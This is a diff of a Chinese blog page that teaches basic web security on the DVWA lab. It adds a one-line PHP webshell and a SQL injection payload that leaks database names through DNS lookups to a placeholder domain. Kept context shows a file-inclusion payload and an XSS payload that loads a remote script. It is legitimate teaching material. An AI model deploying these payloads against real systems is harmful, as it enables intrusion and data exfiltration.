@@ -124,7 +124,9 @@
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://img.mp.itc.cn/upload/20170417/9286692719ce46c1829a3c16486942c3_th.jpeg">
 <meta property="og:image" content="http://yoursite.com/2017/09/19/Web-Security-Demo/1.png">
-<meta property="og:updated_time" content="2017-09-24T12:43:05.000Z">
+<meta property="og:image" content="https://mdn.mozillademos.org/files/13673/HTTP%20&%20layers.png">
+<meta property="og:image" content="https://mdn.mozillademos.org/files/13825/HTTPMsg2.png">
+<meta property="og:updated_time" content="2017-10-05T01:09:32.406Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Web安全扫盲Demo">
 <meta name="twitter:description" content="写在前面  开放式Web应用程序安全项目公布的十大WEB安全漏洞OWASP TOP 10 2017">
@@ -390,14 +392,32 @@
 </li>
 <li><p>Scripts Maker 脚本小子<br>对各种漏洞原理基本掌握，具备一定的Web站点开发与运维经验能力，基本掌握HTTP协议，能够简单审计至少一种脚本语言。能够按照实际需求开发WEB攻击测试脚本，了解浏览器安全</p>
 </li>
-<li><p>Web Hacker 安全研究员/WEB黑客<br>深谙各种漏洞原理，具备丰富的Web站点开发与运维经验能力，熟悉HTTP协议，具备独立审计WEB应用并发现0day漏洞的能力，研究浏览器安全。能够按照需求开发WEB攻击测试框架。</p>
+<li><p>Web Hacker 安全研究员/WEB黑客<br>深谙各种漏洞原理，具备丰富的Web站点开发与运维经验能力，熟知HTTP协议，具备独立审计WEB应用并发现0day漏洞的能力，研究浏览器安全。能够按照需求开发WEB攻击测试框架。</p>
 </li>
-<li><p>Master 大师<br>研究WEB安全前沿领域，培养WEB安全人才。</p>
+<li><p>Master 大师/专家<br>研究WEB安全前沿领域，培养WEB安全人才。</p>
 </li>
 </ul>
-<h4 id="典型WEB应用服务体系"><a href="#典型WEB应用服务体系" class="headerlink" title="典型WEB应用服务体系"></a>典型WEB应用服务体系</h4><p><img src="/2017/09/19/Web-Security-Demo/1.png" alt="WEB应用服务体系"></p>
 <hr>
-<h3 id="WEB安全漏洞演示-Baby-Demo"><a href="#WEB安全漏洞演示-Baby-Demo" class="headerlink" title="WEB安全漏洞演示 Baby Demo"></a>WEB安全漏洞演示 Baby Demo</h3><p>我们将展示基于PHP+MySQL（目前广泛用于中小型站点）的WEB应用漏洞利用过程。展示在<a href="http://www.dvwa.co.uk/index.php" target="_blank" rel="external">Damn Vulnerable Web Application</a>(DVWA) Version 1.9上进行。虽然DVWA于2015-09-19发布1.9版本后再更新，但仍然是比较好WEB安全入门测试平台。</p>
+<h3 id="WEB安全漏洞演示-Baby-Demo"><a href="#WEB安全漏洞演示-Baby-Demo" class="headerlink" title="WEB安全漏洞演示 Baby Demo"></a>WEB安全漏洞演示 Baby Demo</h3><p>我们将展示基于PHP+MySQL（目前广泛用于中小型站点）的WEB应用漏洞利用过程。展示在<a href="http://www.dvwa.co.uk/index.php" target="_blank" rel="external">Damn Vulnerable Web Application</a>(DVWA) Version 1.9上进行。虽然DVWA于2015-09-19发布1.9版本后不再更新，但仍然是比较好WEB安全入门测试平台。</p>
+<h4 id="零、基础知识补充"><a href="#零、基础知识补充" class="headerlink" title="零、基础知识补充"></a>零、基础知识补充</h4><ul>
+<li><strong>典型WEB应用服务体系</strong></li>
+</ul>
+<p><img src="/2017/09/19/Web-Security-Demo/1.png" alt="WEB应用服务体系"></p>
+<p>客户端和服务端通过交换各自的消息（与数据流正好相反）来进行交互。通常由像浏览器这样的客户端发出的消息叫做 requests，那么被服务端回应的消息就叫做 responses。</p>
+<ul>
+<li><strong>HTTP协议与HTTP消息</strong><br><img src="https://mdn.mozillademos.org/files/13673/HTTP%20&amp;%20layers.png" alt="WEB结构"></li>
+</ul>
+<p>HTTP消息是服务器和客户端之间交换数据的方式，其有两种类型的消息︰<br>请求–由客户端发送用来触发一个服务器上的动作；</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">GET /index.php?c=1 HTTP/1.1</div><div class="line">Host: test.org</div><div class="line">Accept-Language: en</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">POST /contact_form.php HTTP/1.1</div><div class="line">Host: test.org</div><div class="line">Content-Length: 64</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line"></div><div class="line">name=Joe%20User&amp;request=Send%20me%20one%20of%20your%20catalogue</div></pre></td></tr></table></figure>
+<p>响应–来自服务器的应答。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 200 OK</div><div class="line">Date: Sat, 09 Oct 2017 14:28:02 GMT</div><div class="line">Server: Apache</div><div class="line">Last-Modified: Tue, 01 Dec 2016 20:18:22 GMT</div><div class="line">ETag: &quot;51142bc1-7449-479b075b2891b&quot;</div><div class="line">Accept-Ranges: bytes</div><div class="line">Content-Length: 29769</div><div class="line">Content-Type: text/html</div><div class="line"></div><div class="line">&lt;!DOCTYPE html... (这里是 29769 字节的网页信息)</div></pre></td></tr></table></figure>
+<p>HTTP消息由采用ASCII编码的多行文本构成。在HTTP/1.1及早期版本中，这些消息通过连接公开地发送。在HTTP/2中，为了优化和性能方面的改进，曾经可人工阅读的消息被分到多个HTTP帧中。</p>
+<p><img src="https://mdn.mozillademos.org/files/13825/HTTPMsg2.png" alt="HTTP传输过程"></p>
+<ul>
+<li><strong>Webshell</strong></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[c]); <span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
 <h4 id="一、信息泄露类"><a href="#一、信息泄露类" class="headerlink" title="一、信息泄露类"></a>一、信息泄露类</h4><h4 id="（一）文件包含漏洞"><a href="#（一）文件包含漏洞" class="headerlink" title="（一）文件包含漏洞"></a>（一）文件包含漏洞</h4><p>PHP文件包含漏洞的产生原因是在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。</p>
 <ul>
 <li><strong>漏洞发现</strong><ol>
@@ -415,6 +435,11 @@
 </blockquote>
 <ul>
 <li><strong>Payload</strong>:<br><code>file=file_path_youwant</code></li>
+</ul>
+<ul>
+<li><p>文件包含并非鸡肋漏洞，满足特定条件甚至可以getshell</p>
+<p>参见：<a href="http://www.freebuf.com/articles/web/79830.html" target="_blank" rel="external">LFI+PHPInfo getshell</a></p>
+</li>
 </ul>
 <h4 id="二、注入类"><a href="#二、注入类" class="headerlink" title="二、注入类"></a>二、注入类</h4><h5 id="（一）命令与代码注入漏洞-Command-Code-Injection"><a href="#（一）命令与代码注入漏洞-Command-Code-Injection" class="headerlink" title="（一）命令与代码注入漏洞 Command/Code Injection"></a>（一）命令与代码注入漏洞 Command/Code Injection</h5><ul>
 <li><p><strong>漏洞发现</strong></p>
@@ -466,6 +491,12 @@
 <li><p><strong>使用sqlmap测试（略）</strong></p>
 </li>
 </ol>
+<h4 id="关于注入类漏洞的高级利用————盲注与DNS-log"><a href="#关于注入类漏洞的高级利用————盲注与DNS-log" class="headerlink" title="关于注入类漏洞的高级利用————盲注与DNS log"></a>关于注入类漏洞的高级利用————盲注与DNS log</h4><p>DNS在解析的时候会留下日志，我们可以把信息放在高级域名中，读取传递来的日志从而获取信息</p>
+<p>例如我们有域名是：test.org,我们把信息置于二级域名处<code>info.test.org</code>。在服务器端发起域名解析请求，那么就能收到info这个信息。</p>
+<p>使用DNS log来获取回显，以下是两个典型场景：<br>1.一个SQL盲注点，但普通盲注手段需要频繁请求，使得ip被ban。</p>
+<p><a href="https://arxiv.org/ftp/arxiv/papers/1303/1303.3047.pdf" target="_blank" rel="external">Data Retrieval over DNS in SQL Injection Attacks</a></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">load_file(concat('\\\\',(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="string">'.domain.com\\abc'</span>))</div></pre></td></tr></table></figure>
+<p>2.疑似命令注入点，但目标站点不回显，无法确认。</p>
 <h4 id="三、前端类"><a href="#三、前端类" class="headerlink" title="三、前端类"></a>三、前端类</h4><h5 id="（一）跨站脚本攻击漏洞"><a href="#（一）跨站脚本攻击漏洞" class="headerlink" title="（一）跨站脚本攻击漏洞"></a>（一）跨站脚本攻击漏洞</h5><ul>
 <li><strong>示例代码</strong></li>
 </ul>
@@ -484,7 +515,10 @@
  <figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;<span class="regexp">/div&gt;&lt;script src="http:/</span><span class="regexp">/172.17.205.233/</span>xss/myjs/s.js<span class="string">"&gt;&lt;/script&gt;</span></div></pre></td></tr></table></figure>
 </li>
 </ol>
-<h4 id="四、综合Demo"><a href="#四、综合Demo" class="headerlink" title="四、综合Demo"></a>四、综合Demo</h4>
+<h4 id="四、综合Demo"><a href="#四、综合Demo" class="headerlink" title="四、综合Demo"></a>四、综合Demo</h4><blockquote>
+<p>海洋CMS 6.45版本前台getshell漏洞 </p>
+</blockquote>
+
       
     </div>
     
@@ -685,7 +719,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#写在前面"><span class="nav-number">1.</span> <span class="nav-text">写在前面</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#WEB安全三境界"><span class="nav-number">1.1.</span> <span class="nav-text">WEB安全三境界</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#典型WEB应用服务体系"><span class="nav-number">1.2.</span> <span class="nav-text">典型WEB应用服务体系</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WEB安全漏洞演示-Baby-Demo"><span class="nav-number">2.</span> <span class="nav-text">WEB安全漏洞演示 Baby Demo</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#一、信息泄露类"><span class="nav-number">2.1.</span> <span class="nav-text">一、信息泄露类</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（一）文件包含漏洞"><span class="nav-number">2.2.</span> <span class="nav-text">（一）文件包含漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#二、注入类"><span class="nav-number">2.3.</span> <span class="nav-text">二、注入类</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#（一）命令与代码注入漏洞-Command-Code-Injection"><span class="nav-number">2.3.1.</span> <span class="nav-text">（一）命令与代码注入漏洞 Command/Code Injection</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#（二）-SQL注入漏洞"><span class="nav-number">2.3.2.</span> <span class="nav-text">（二） SQL注入漏洞</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#三、前端类"><span class="nav-number">2.4.</span> <span class="nav-text">三、前端类</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#（一）跨站脚本攻击漏洞"><span class="nav-number">2.4.1.</span> <span class="nav-text">（一）跨站脚本攻击漏洞</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#四、综合Demo"><span class="nav-number">2.5.</span> <span class="nav-text">四、综合Demo</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#写在前面"><span class="nav-number">1.</span> <span class="nav-text">写在前面</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#WEB安全三境界"><span class="nav-number">1.1.</span> <span class="nav-text">WEB安全三境界</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WEB安全漏洞演示-Baby-Demo"><span class="nav-number">2.</span> <span class="nav-text">WEB安全漏洞演示 Baby Demo</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#零、基础知识补充"><span class="nav-number">2.1.</span> <span class="nav-text">零、基础知识补充</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#一、信息泄露类"><span class="nav-number">2.2.</span> <span class="nav-text">一、信息泄露类</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（一）文件包含漏洞"><span class="nav-number">2.3.</span> <span class="nav-text">（一）文件包含漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#二、注入类"><span class="nav-number">2.4.</span> <span class="nav-text">二、注入类</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#（一）命令与代码注入漏洞-Command-Code-Injection"><span class="nav-number">2.4.1.</span> <span class="nav-text">（一）命令与代码注入漏洞 Command/Code Injection</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#（二）-SQL注入漏洞"><span class="nav-number">2.4.2.</span> <span class="nav-text">（二） SQL注入漏洞</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#关于注入类漏洞的高级利用————盲注与DNS-log"><span class="nav-number">2.5.</span> <span class="nav-text">关于注入类漏洞的高级利用————盲注与DNS log</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#三、前端类"><span class="nav-number">2.6.</span> <span class="nav-text">三、前端类</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#（一）跨站脚本攻击漏洞"><span class="nav-number">2.6.1.</span> <span class="nav-text">（一）跨站脚本攻击漏洞</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#四、综合Demo"><span class="nav-number">2.7.</span> <span class="nav-text">四、综合Demo</span></a></li></ol></li></ol></div>
             
 
           </div>
